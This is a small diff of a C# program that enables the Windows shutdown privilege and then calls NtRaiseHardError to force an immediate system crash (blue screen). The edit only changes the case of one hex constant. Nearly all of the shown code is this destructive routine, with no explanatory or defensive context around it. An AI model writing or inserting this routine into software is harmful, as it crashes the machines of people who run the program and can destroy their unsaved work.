@@ -67,7 +67,7 @@ public static class Program {
         bool PreviousValue; 
 	uint Response;
         RtlAdjustPrivilege(19, true, false, out PreviousValue);
-        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out Response);
+        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out Response);
 
     }
 }
